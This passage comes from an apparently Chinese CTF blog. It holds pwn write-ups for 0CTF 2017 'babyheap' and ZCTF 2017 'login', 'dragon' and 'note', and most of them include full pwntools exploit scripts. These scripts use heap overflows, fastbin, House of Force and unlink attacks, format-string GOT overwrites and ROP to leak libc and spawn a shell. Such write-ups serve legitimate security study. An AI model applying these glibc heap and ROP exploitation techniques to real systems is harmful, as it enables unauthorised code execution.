class="number">0</span>)</div><div class="line"></div><div class="line">    payload = <span class="string">''</span></div><div class="line">    payload += p64(<span class="number">0x43</span>)</div><div class="line">    payload += p64(<span class="number">0x408</span>)</div><div class="line">    payload += p64(binsh_addr)</div><div class="line">    payload += p64(system_addr)</div><div class="line"></div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'A\n'</span>)</div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'GGGGGGGGGGGGGGGG\n'</span>)</div><div class="line">    New(p, <span class="number">2016</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>任意字节的堆溢出，但是用的<code>calloc()</code>，申请对块时会清空推块内容，不好leak，后来使用extend chunk的方法产生堆块重叠，释放一个被覆盖的堆块来leak main_arena<br>之后决定利用unsort bin attack，修改<code>global_max_fast</code>位<code>main_arena</code>指针，这样之后所有大小堆块都会被当作fast chunk来对待<br>西电dalao在题目给的libc里发现一个离<code>__malloc_hook</code>很近地方的值为0x300，利用fastbin attack将堆块分配到那，然后修改<code>__malloc_hook</code>为libc中<code>execve(&quot;/bin/sh&quot;)</code>的one-gadget来getshell<br>这里就贴一个我本机跑起来的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'info'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(p, idx, size, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./babyheap_patched'</span>)</div><div class="line"><span class="comment">#p = remote('202.120.7.218', 2017)</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#</span></div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#</span></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x90</span> * <span class="number">2</span> + <span class="number">1</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">0</span>, len(payload), payload)</div><div class="line"></div><div class="line">Free(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x90</span> * <span class="number">2</span> - <span class="number">0x10</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, len(payload), payload)</div><div class="line"></div><div class="line">Free(p, <span class="number">2</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, <span class="number">0x90</span>, <span class="string">'A'</span> * <span class="number">0x90</span>)</div><div class="line"></div><div class="line">Free(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">Dump(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x90</span>)</div><div class="line"></div><div class="line">main_arena = u64(p.recvn(<span class="number">8</span>))</div><div class="line">heap_addr = u64(p.recvn(<span class="number">8</span>))</div><div class="line"><span class="string">'''</span></div><div class="line">libc_base = main_arena - 0x398b58</div><div class="line">global_max_fast = libc_base + 0x39a7d0</div><div class="line">'''</div><div class="line"></div><div class="line">libc_base = main_arena - <span class="number">0x3a5678</span></div><div class="line">global_max_fast = libc_base + <span class="number">0x3a7860</span></div><div class="line"></div><div class="line">log.info(<span class="string">"main_arena : "</span> + hex(main_arena))</div><div class="line">log.info(<span class="string">"heap addr : "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line">payload += p64(global_max_fast - <span class="number">0x10</span>) * <span class="number">2</span></div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, len(payload), payload)</div><div class="line"></div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#modify global_max_fast</span></div><div class="line"></div><div class="line">Free(p, <span class="number">5</span>)<span class="comment">#free 0x2f0 chunk(malloc before)</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">Free(p, <span class="number">4</span>)<span class="comment">#free 0x2f0 chunk(just malloc)</span></div><div class="line"></div><div class="line">fake_chunk_header = <span class="number">0x398617</span> + libc_base</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line">payload += p64(heap_addr - <span class="number">0x120</span>)</div><div class="line">payload += p64(main_arena)</div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x70</span></div><div class="line">payload += p64(<span class="number">0x90</span>)</div><div class="line">payload += p64(<span class="number">0x300</span>)</div><div class="line">payload += p64(fake_chunk_header)</div><div class="line"></div><div class="line">Fill(p, <span class="number">3</span>, len(payload), payload)</div><div class="line"></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">New(p, <span class="number">0x2f0</span>)<span class="comment">#point to fake chunk</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x4c9</span></div><div class="line">payload += p64(libc_base + <span class="number">0x00000000003F33A</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">5</span>, len(payload), payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-ZCTF-2017-write-up" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/02/27/ZCTF-2017-write-up/" class="article-date">
  	<time datetime="2017-02-27T14:28:08.000Z" itemprop="datePublished">2017-02-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/27/ZCTF-2017-write-up/">
        ZCTF 2017 write up
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>刚开始看这题的时候有点不知所云，完全不知道是要leak canary还是爆破来做，第二天想到，<code>succ()</code>中<code>sprintf()</code>函数的格式化字符串参数是在栈上的，<br>尝试下用s1修改他,果然成功修改输出s2的格式(第一天的时候就有这个现象了，当时还以为<code>printf()</code>有bug…)<br>然后就是用格式化字符串修改<code>stack_chk_fail@got</code>，原本是想找个ret的gadget，但是很奇怪的是没办法用格式化字符串精确修改，好像每多输出一个字符修改的结果会多2，<br>后来发现只修改一个字节刚好可以把<code>stack_chk_fail@got</code>修改成<code>malloc@plt + 6</code>这样即使修改了canary函数也可以正常返回，然后就可以愉快的做ROP了<br>然后做ROP执行<code>system(&#39;/bin/sh&#39;)</code>的时候老是失败，感觉是因为前面的格式化字符串修改了太多栈的内容影响到了<code>system()</code>,<br>于是转而用syscall执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code>这里要把ecx,edx都设置为0，然而<code>sprintf()</code>遇到\x00就断了，<br>调试的时候发现执行ROP的时候edx已经为0了，然后在题目给的libc里面找到了这么一个gadget</p>
<pre><code>0x000282d3 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
</code></pre><p>然后就可以愉快的getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">main_addr = <span class="number">0x0804878C</span></div><div class="line">stack_chk_fail_got = <span class="number">0x0804A014</span></div><div class="line">malloc_got = <span class="number">0x0804A018</span></div><div class="line">puts_plt = <span class="number">0x080484C0</span></div><div class="line">ret = <span class="number">0x804844e</span></div><div class="line">pop_ret = <span class="number">0x08048465</span></div><div class="line">inc_ecx_ret = <span class="number">0x08048aee</span></div><div class="line">ebx_ret = <span class="number">0x08048465</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">i = 1</div><div class="line">while i &lt; 100:</div><div class="line">    p = process('./login')</div><div class="line">    p.recvuntil('Input the username:')</div><div class="line">    payload = ''</div><div class="line">    payload += p32(stack_chk_fail_got)</div><div class="line">    payload += 'A' * (0x4c)</div><div class="line">    payload += p32(main_addr)</div><div class="line">    payload += p32(stack_chk_fail_got) * 9 + 'AA'</div><div class="line">    payload += 'KK:%' + str(i) + '$x'</div><div class="line">    p.send(payload + '\n')</div><div class="line">    p.recvuntil('Input the password:')</div><div class="line">    p.send('123\n')</div><div class="line">    p.recvuntil("$x:")</div><div class="line">    data = int(p.recvuntil(':', drop = True), 16)</div><div class="line">    if data == stack_chk_fail_got:</div><div class="line">        print "succ", i</div><div class="line">        exit(0)</div><div class="line">    p.close()</div><div class="line">    i = i + 1</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="comment">#p = process('./login')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4002</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p32(stack_chk_fail_got)</div><div class="line">payload += p32(stack_chk_fail_got + <span class="number">1</span>) * <span class="number">19</span></div><div class="line">payload += p32(main_addr)</div><div class="line">payload += p32(stack_chk_fail_got) * <span class="number">9</span> + <span class="string">'AA'</span></div><div class="line">payload += <span class="string">'K:%47c'</span></div><div class="line">payload += <span class="string">'%10$hhn'</span></div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(puts_plt)</div><div class="line">payload += p32(pop_ret)</div><div class="line">payload += p32(malloc_got)</div><div class="line">payload += p32(main_addr)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">malloc_addr = u32(p.recvn(<span class="number">4</span>))</div><div class="line">log.info(<span class="string">'malloc() addr: '</span> + hex(malloc_addr))</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"><span class="comment">#libc = ELF('./local.libc32')</span></div><div class="line"></div><div class="line">offset_malloc = libc.symbols[<span class="string">'malloc'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line">offset_binsh = next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line"></div><div class="line">libc_base = malloc_addr - offset_malloc</div><div class="line">system_addr = libc_base + offset_system</div><div class="line">binsh_addr = libc_base + offset_binsh</div><div class="line"></div><div class="line"><span class="comment">#int80 = libc_base + 0x000B14DD</span></div><div class="line">int80 = libc_base + <span class="number">0x000B4EBB</span></div><div class="line">xorecx_ebx_pppop_ret = libc_base + <span class="number">0x000282d3</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(xorecx_ebx_pppop_ret)</div><div class="line">payload += p32(binsh_addr)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">3</span></div><div class="line">payload += p32(int80)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h2><p>程序漏洞在申请堆块存放content的时候是根据输入字符串大小申请堆块的，然是<code>edit()</code>函数固定修改32个字节，这样就存在溢出了<br>利用House of Force这个技巧，溢出修改Top Chunk的大小，而且程序申请堆块存放name的时候，也只是检查长度是否小于32，并没有检查是否为负数，<br>这样就可以申请大小为负的堆块，然后分配到一个指向bss段中的list，然后就可以任意读写了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size, name, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name: '</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input new note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./dragon')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">11501</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'B'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'C'</span> * <span class="number">0x10</span>, <span class="string">'D'</span> * <span class="number">0x20</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x20</span>)</div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">List(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x10</span>)</div><div class="line">data = p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>)</div><div class="line"><span class="keyword">if</span> len(data) &lt; <span class="number">4</span>:</div><div class="line">    log.error(<span class="string">"maybe error!"</span>)</div><div class="line">    exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">heap_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"heap addr : "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">fake_note = heap_addr + <span class="number">0x80</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'E'</span> * <span class="number">0x20</span>, <span class="string">'F'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x18</span>, <span class="string">'G'</span> * <span class="number">0x18</span>, <span class="string">'H'</span> * <span class="number">0x17</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, <span class="string">'H'</span> * <span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</div><div class="line"></div><div class="line">top_chunk = heap_addr + <span class="number">0x148</span></div><div class="line">offset = <span class="number">0x00000000006020e0</span> - top_chunk</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">p.send(<span class="string">'1\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">p.send(str(offset - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">p.send(p64(fake_note))</div><div class="line"></div><div class="line">List(p, <span class="number">2</span>)</div><div class="line">p.recvuntil(<span class="string">'name: '</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>)</div><div class="line">libc_start_main_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"__libc_start_main() addr: "</span> + hex(libc_start_main_addr))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line">offset_libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">libc_base = libc_start_main_addr - offset_libc_start_main</div><div class="line">system_addr = libc_base + offset_system</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602018</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x602018</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, p64(system_addr))</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'SH'</span>, <span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><code>note</code>结构体中有<code>Title</code>和<code>content</code>，特别没良心的不给<code>Show</code>功能，<br>漏洞点在<code>EditContent</code>功能一次只能修改48个字节的<code>content</code>，但是允许从<code>content</code>后部开始修改，<br>程序使用的是talloc，网上搜索了一波发现貌似还有点复杂，不过调试发现talloc的chunk只是拓展了ptmalloc的堆块结构，<br>而且释放内存实际上最终还是要执行ptmalloc的<code>free()</code>，所以完全可以当作老式的linux exploit来搞<br>利用溢出来做unlink attack，然后我们就的到了一个指向在<code>bss</code>段的<code>note list</code>的指针，修改<code>_talloc_free@got</code>为<code>puts@plt + 6</code>，这样就把<code>Delete()</code>变成了<code>Show</code><br>但这样并不能leak libc,因为在程序释放内存之前会对堆块做检查，这样就无法直接读<code>got</code>，只能leak堆上的<code>main_arena</code>指针了<br>在这之前要先得到堆地址，<code>note</code>结构体中，<code>Title</code>紧跟着<code>content_ptr</code>，把<code>Title</code>填满就可以leak heap了，<br>但是程序的<code>ChangeTitle()</code>函数读取输入的时候会在输入的末尾补<code>\x00</code>，而且非常诡异的是只要把Title填满，下一次<code>atoi()</code>函数的结果一定会为0，程序直接退出<br>后来发现<code>EditContent()</code>是不会在输入末尾补<code>\x00</code>的，然后利用之前unlink的到的指针修改note list，将其作为一个<code>note</code>结构体，<br>这样就可以用<code>EditContent()</code>的方法修改某个note的<code>Title</code>,然后打印出来就可以的到堆的地址，<br>之后要打印出堆上的<code>main_arena</code>指针，但是<code>main_arena</code>指针的位置在堆块的头部，并不在<code>Title</code>的位置，无法通过<code>Delete()</code>函数的检查，<br>所以在这之前，利用之前指向note list的指针，多次修改堆内容，将<code>main_arena</code>指针前面的内容修改成一个talloc的chunk头部，然后就可以通过检查，将<code>main_arena</code>的指针打印出来<br>然后就可以修改<code>atoi@got</code>为<code>system()</code>，输入<code>/bin/sh</code>就可以getshell了</p>
